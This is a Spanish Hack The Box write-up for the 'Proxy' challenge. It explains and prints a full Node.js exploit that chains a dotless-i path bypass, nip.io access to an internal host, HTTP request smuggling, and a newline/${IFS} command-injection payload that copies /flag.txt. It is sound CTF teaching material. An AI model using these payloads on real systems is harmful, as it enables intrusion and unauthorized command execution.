# Proxy — HTB Writeup

## Introducción

El objetivo del challenge **Proxy** es conseguir acceder a una funcionalidad protegida del backend y utilizarla para ejecutar comandos en el servidor, obteniendo finalmente la flag.

La explotación se basa en encadenar varias vulnerabilidades:

1. **Turkish dotless `ı`** para evadir el filtro de la ruta.
2. **`nip.io`** para acceder al backend interno evitando el filtro de IP.
3. **HTTP Request Smuggling** para introducir una segunda petición HTTP.
4. **Command Injection** en `/flushInterface`.
5. Copiar `/flag.txt` a un archivo accesible públicamente.
6. Realizar un `GET /` para obtener la flag.

---

# 1. Reconocimiento

El challenge proporciona un servicio accesible mediante:

```javascript
const TARGET = "154.57.164.71";
const PORT = 32134;
```

El servicio funciona como un **proxy** que se encuentra delante de un backend interno.

Durante el análisis encontramos que el backend utiliza:

```text
10.244.3.77:5000
```

y dispone de un endpoint interesante:

```text
POST /flushInterface
```

El problema es que este endpoint está protegido por el proxy.

Por lo tanto, necesitamos encontrar una forma de hacer que una petición pueda atravesar el proxy y posteriormente ser interpretada por el backend como una petición legítima a:

```text
/flushInterface
```

---

# 2. Cadena de ataque

La explotación completa se puede resumir en los siguientes pasos:

1. **Encontramos el endpoint protegido `/flushInterface`.**

2. **Utilizamos `ı` (Turkish dotless I)** para enviar:
   ```text
   /flushınterface
   ```
   y evadir el filtro del proxy.

3. **Utilizamos `nip.io`** para representar la IP interna:
   ```text
   10-244-3-77.nip.io
   ```
   que resuelve a:
   ```text
   10.244.3.77
   ```

4. **Construimos un HTTP Request Smuggling**, enviando dos requests dentro de la misma conexión TCP.

5. El primer request utiliza:
   ```http
   Content-Length: 2
   ```
   y tiene como body:
   ```text
   {}
   ```

6. Después del primer body introducimos un segundo request:
   ```http
   POST /flushInterface
   ```

7. El backend termina procesando el segundo request y llegamos al endpoint protegido.

8. Enviamos un payload de **Command Injection** mediante el parámetro `interface`:
   ```text
   lo\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html
   ```

9. El backend termina ejecutando:
   ```bash
   ip addr flush lo
   cp /flag.txt /app/proxy/includes/index.html
   ```

10. La flag queda copiada en:
    ```text
    /app/proxy/includes/index.html
    ```

11. Finalmente hacemos:
    ```http
    GET /
    ```

12. El servidor devuelve el contenido de `index.html`, que ahora contiene la flag.

---

# 3. Bypass del endpoint con Turkish Dotless I

El endpoint real que queremos alcanzar es:

```text
/flushInterface
```

Sin embargo, el proxy bloquea el acceso directo.

Podemos utilizar el carácter Unicode:

```text
ı
```

conocido como **Turkish dotless I**.

De esta forma enviamos:

```text
/flushınterface
```

En el exploit aparece como:

```javascript
const firstReq = Buffer.from(
    "POST /flush\u0131nterface HTTP/1.1\r\n" +
    "Host: 10-244-3-77.nip.io:5000\r\n" +
    "Content-Type: application/json\r\n" +
    "Content-Length: 2\r\n" +
    "\r\n"
);
```

El `\u0131` representa:

```text
ı
```

Por lo tanto, la petición contiene:

```http
POST /flushınterface HTTP/1.1
```

La vulnerabilidad aparece debido a una diferencia en la normalización de Unicode entre las distintas capas de la aplicación.

El proxy puede interpretar:

```text
/flushınterface
```

como una ruta diferente de:

```text
/flushInterface
```

mientras que posteriormente el backend puede normalizar el carácter y terminar procesando la petición como:

```text
/flushInterface
```

Esto nos permite superar el filtro del proxy.

---

# 4. Bypass del filtrado de IP mediante nip.io

El backend se encuentra en una IP interna:

```text
10.244.3.77
```

El proxy puede bloquear directamente el acceso a direcciones privadas.

Para evitarlo utilizamos:

```text
10-244-3-77.nip.io
```

`nip.io` permite codificar una IP dentro de un hostname.

Por lo tanto:

```text
10-244-3-77.nip.io
```

resuelve a:

```text
10.244.3.77
```

Utilizamos entonces:

```http
Host: 10-244-3-77.nip.io:5000
```

en lugar de:

```http
Host: 10.244.3.77:5000
```

De esta manera podemos alcanzar el backend interno sin escribir directamente la IP privada en el request.

---

# 5. HTTP Request Smuggling

Ahora necesitamos conseguir que el backend procese una segunda petición HTTP.

Para ello construimos dos requests dentro de la misma conexión TCP.

La primera petición es:

```http
POST /flushınterface HTTP/1.1
Host: 10-244-3-77.nip.io:5000
Content-Type: application/json
Content-Length: 2

{}
```

Lo importante es:

```http
Content-Length: 2
```

porque el body tiene exactamente dos bytes:

```text
{}
```

Después de esos dos bytes agregamos:

```text
\r\n\r\n
```

y una segunda petición HTTP completa:

```http
POST /flushInterface HTTP/1.1
Host: 10-244-3-77.nip.io:5000
Content-Type: application/json
Content-Length: ...

{"interface":"..."}
```

La segunda petición se construye mediante:

```javascript
const secondReq = Buffer.concat([
    Buffer.from(
        "POST /flushInterface HTTP/1.1\r\n" +
        "Host: 10-244-3-77.nip.io:5000\r\n" +
        "Content-Type: application/json\r\n" +
        `Content-Length: ${payloadBody.length}\r\n` +
        "\r\n"
    ),
    payloadBody
]);
```

Y finalmente concatenamos ambas:

```javascript
const fullRequest = Buffer.concat([
    firstReq,
    body1,
    Buffer.from("\r\n\r\n"),
    secondReq
]);
```

El request que enviamos contiene conceptualmente:

```text
Request 1
    POST /flushınterface
    Content-Length: 2

    {}

Request 2
    POST /flushInterface
    Content-Length: XX

    {"interface":"..."}
```

La idea es que después de consumir los dos bytes de:

```text
{}
```

los bytes restantes puedan interpretarse como una nueva petición HTTP.

---

# 6. ¿Por qué usamos un socket TCP?

Para realizar el Request Smuggling necesitamos controlar exactamente los bytes enviados.

Por eso no utilizamos:

```text
fetch
axios
```

ni otra abstracción HTTP.

En su lugar utilizamos el módulo `net` de Node.js:

```javascript
const net = require("net");
```

y creamos directamente un socket:

```javascript
const client = new net.Socket();
```

Finalmente enviamos nuestro request completo:

```javascript
client.write(fullRequest);
```

Esto nos permite controlar manualmente:

- los headers;
- `Content-Length`;
- los saltos de línea;
- el body;
- y la segunda petición concatenada.

---

# 7. Command Injection

Una vez que conseguimos acceder a:

```text
/flushInterface
```

podemos atacar el parámetro:

```json
{
    "interface": "..."
}
```

El payload utilizado es:

```javascript
const payloadBody = Buffer.from(
    '{"interface":"lo\\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html"}'
);
```

La parte interesante es:

```text
lo\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html
```

La intención es que el backend termine ejecutando algo equivalente a:

```bash
ip addr flush lo
cp /flag.txt /app/proxy/includes/index.html
```

El primer comando es el comportamiento esperado del endpoint:

```bash
ip addr flush lo
```

Mientras que el segundo comando es nuestra inyección:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

---

# 8. El uso de `\n`

El payload contiene:

```text
lo\ncp...
```

El `\n` permite introducir un salto de línea y separar el comando original de nuestro segundo comando.

Conceptualmente, buscamos convertir:

```text
ip addr flush <interface>
```

en:

```bash
ip addr flush lo
cp /flag.txt /app/proxy/includes/index.html
```

Así, el comando que agregamos se ejecuta independientemente del comando legítimo.

---

# 9. El uso de `${IFS}`

El comando que queremos ejecutar normalmente sería:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

Sin embargo, los espacios pueden ser filtrados.

Para evitar introducir espacios utilizamos:

```text
${IFS}
```

En Bash, `${IFS}` representa el **Internal Field Separator**.

Por lo tanto:

```bash
cp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html
```

puede interpretarse como:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

De esta manera podemos construir el comando sin utilizar espacios explícitos.

---

# 10. Copiando la flag

Nuestro objetivo es leer:

```text
/flag.txt
```

Pero no tenemos necesariamente acceso directo a ese archivo mediante HTTP.

Por eso lo copiamos a:

```text
/app/proxy/includes/index.html
```

El comando ejecutado es:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

De esta manera, si `index.html` es servido por la aplicación, podemos recuperar la flag realizando simplemente:

```http
GET /
```

El flujo queda:

```text
/flag.txt
    ↓
cp
    ↓
/app/proxy/includes/index.html
    ↓
GET /
    ↓
FLAG
```

---

# 11. Recuperación de la flag

Después de enviar el exploit esperamos un segundo:

```javascript
setTimeout(fetchFlag, 1000);
```

Esto permite que el backend tenga tiempo para ejecutar el command injection y copiar el archivo.

Después abrimos una segunda conexión:

```javascript
const client2 = new net.Socket();
```

y enviamos:

```http
GET / HTTP/1.1
Host: test.com:80

```

Mediante:

```javascript
const req =
    "GET / HTTP/1.1\r\n" +
    "Host: test.com:80\r\n" +
    "\r\n";
```

Si todo ha funcionado correctamente, el servidor devolverá el contenido de `index.html`.

Como previamente hicimos:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

la respuesta contiene la flag.

Finalmente:

```javascript
console.log("Flag:");
console.log(data.toString());
```

muestra el contenido recibido.

---

# 12. Exploit completo

```javascript
#!/usr/bin/env node

const net = require("net");

const TARGET = "154.57.164.71";
const PORT = 32134;

const payloadBody = Buffer.from(
    '{"interface":"lo\\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html"}'
);

const body1 = Buffer.from("{}");

const secondReq = Buffer.concat([
    Buffer.from(
        "POST /flushInterface HTTP/1.1\r\n" +
        "Host: 10-244-3-77.nip.io:5000\r\n" +
        "Content-Type: application/json\r\n" +
        `Content-Length: ${payloadBody.length}\r\n` +
        "\r\n"
    ),
    payloadBody
]);

const firstReq = Buffer.from(
    "POST /flush\u0131nterface HTTP/1.1\r\n" +
    "Host: 10-244-3-77.nip.io:5000\r\n" +
    "Content-Type: application/json\r\n" +
    "Content-Length: 2\r\n" +
    "\r\n"
);

const fullRequest = Buffer.concat([
    firstReq,
    body1,
    Buffer.from("\r\n\r\n"),
    secondReq
]);

console.log("Enviando request...");

const client = new net.Socket();
client.setTimeout(30000);

client.connect(PORT, TARGET, () => {
    console.log("Conectado");
    client.write(fullRequest);
});

client.on("data", (data) => {
    console.log("[*] Response:");
    console.log(data.toString());

    client.destroy();

    setTimeout(fetchFlag, 1000);
});

client.on("error", (err) => {
    console.error(err.message);
});

function fetchFlag() {

    console.log("Pidiendo la flag...");

    const client2 = new net.Socket();

    const req =
        "GET / HTTP/1.1\r\n" +
        "Host: test.com:80\r\n" +
        "\r\n";

    client2.connect(PORT, TARGET, () => {
        client2.write(req);
    });

    client2.on("data", (data) => {
        console.log("Flag:");
        console.log(data.toString());

        client2.destroy();
    });

    client2.on("error", (err) => {
        console.error(err.message);
    });
}
```

---

# 13. Explotación paso a paso

En esta sección se explica con más detalle qué sucede desde que ejecutamos el exploit hasta que obtenemos la flag.

## Paso 1 — Conectarnos al proxy

El exploit abre una conexión TCP directamente contra:

```text
154.57.164.71:32134
```

mediante:

```javascript
const client = new net.Socket();

client.connect(PORT, TARGET, () => {
    client.write(fullRequest);
});
```

No enviamos una petición HTTP mediante una librería tradicional, sino los bytes directamente sobre TCP.

---

## Paso 2 — Enviar la primera petición

La primera petición utiliza:

```http
POST /flushınterface HTTP/1.1
Host: 10-244-3-77.nip.io:5000
Content-Type: application/json
Content-Length: 2

{}
```

Hay dos detalles importantes.

Primero:

```text
/flushınterface
```

utiliza `ı` en lugar de la `I` habitual.

Segundo:

```text
10-244-3-77.nip.io
```

representa mediante DNS a:

```text
10.244.3.77
```

---

## Paso 3 — Pasar el filtro de la ruta

El proxy recibe:

```text
/flushınterface
```

en lugar de:

```text
/flushInterface
```

Esto permite evadir la comprobación que busca específicamente el endpoint protegido.

Posteriormente, debido a la normalización utilizada por las diferentes capas, el backend puede interpretar la ruta como:

```text
/flushInterface
```

---

## Paso 4 — Pasar el filtro de IP

El proxy tampoco recibe directamente:

```text
10.244.3.77
```

sino:

```text
10-244-3-77.nip.io
```

El hostname resuelve mediante DNS a:

```text
10.244.3.77
```

por lo que podemos alcanzar el backend interno.

---

## Paso 5 — Terminar el primer request

El primer request declara:

```http
Content-Length: 2
```

y el body es:

```text
{}
```

que ocupa exactamente dos bytes.

Por lo tanto, el parser HTTP consume:

```text
{}
```

como body de la primera petición.

Después de esos dos bytes todavía quedan datos en el socket.

---

## Paso 6 — Introducir el segundo request

Después del primer body enviamos:

```text
\r\n\r\n
```

y a continuación:

```http
POST /flushInterface HTTP/1.1
Host: 10-244-3-77.nip.io:5000
Content-Type: application/json
Content-Length: ...

{"interface":"..."}
```

Así conseguimos que la conexión contenga dos peticiones consecutivas.

La primera sirve principalmente para atravesar los filtros del proxy.

La segunda es la petición que realmente queremos que procese el backend.

---

## Paso 7 — Llegar a `/flushInterface`

El segundo request apunta directamente a:

```text
/flushInterface
```

y contiene el parámetro:

```json
{
    "interface": "lo\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html"
}
```

En este punto ya conseguimos alcanzar el endpoint que inicialmente estaba protegido.

---

## Paso 8 — Ejecutar el Command Injection

El backend utiliza el valor de `interface` para construir el comando asociado a:

```text
ip addr flush
```

Nuestro input contiene:

```text
lo\ncp...
```

por lo que conseguimos introducir un segundo comando después del comando esperado.

Conceptualmente terminamos con:

```bash
ip addr flush lo
cp /flag.txt /app/proxy/includes/index.html
```

El segundo comando es el que nos interesa.

---

## Paso 9 — Utilizar `${IFS}`

El segundo comando está escrito como:

```bash
cp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html
```

en lugar de:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

Esto evita utilizar espacios explícitos y permite superar posibles filtros.

Bash interpreta `${IFS}` como separador entre los diferentes argumentos.

Por lo tanto, el resultado efectivo es:

```bash
cp /flag.txt /app/proxy/includes/index.html
```

---

## Paso 10 — Copiar la flag

El comando copia:

```text
/flag.txt
```

a:

```text
/app/proxy/includes/index.html
```

De esta manera no necesitamos leer directamente `/flag.txt`.

En cambio, hacemos que su contenido esté disponible a través de un archivo que la aplicación ya sirve públicamente.

---

## Paso 11 — Esperar la ejecución

El exploit espera un segundo:

```javascript
setTimeout(fetchFlag, 1000);
```

La espera permite que el backend termine de procesar la petición y que el archivo sea sobrescrito.

---

## Paso 12 — Solicitar `/`

Finalmente se abre una nueva conexión TCP y se envía:

```http
GET / HTTP/1.1
Host: test.com:80

```

El servidor responde con el contenido de su página principal.

Como `index.html` fue reemplazado por el contenido de `/flag.txt`, la respuesta contiene la flag.

El exploit la imprime mediante:

```javascript
console.log("Flag:");
console.log(data.toString());
```

---

# 14. Resumen final

La explotación completa consiste en:

1. Encontrar el endpoint protegido `/flushInterface`.
2. Utilizar `ı` para evadir el filtro de la ruta.
3. Utilizar `nip.io` para alcanzar la IP privada del backend.
4. Crear dos peticiones HTTP dentro de una misma conexión TCP.
5. Utilizar `Content-Length: 2` para terminar la primera petición después de `{}`.
6. Hacer que el backend procese la segunda petición hacia `/flushInterface`.
7. Aprovechar el parámetro `interface` para realizar Command Injection.
8. Utilizar `\n` para introducir un segundo comando.
9. Utilizar `${IFS}` para evitar espacios.
10. Copiar `/flag.txt` a `/app/proxy/includes/index.html`.
11. Hacer `GET /`.
12. Obtener la flag desde el `index.html` modificado.

La cadena final es:

```text
Turkish dotless I
        ↓
IP filter bypass con nip.io
        ↓
HTTP Request Smuggling
        ↓
Acceso a /flushInterface
        ↓
Command Injection
        ↓
Copiar /flag.txt
        ↓
GET /
        ↓
FLAG
```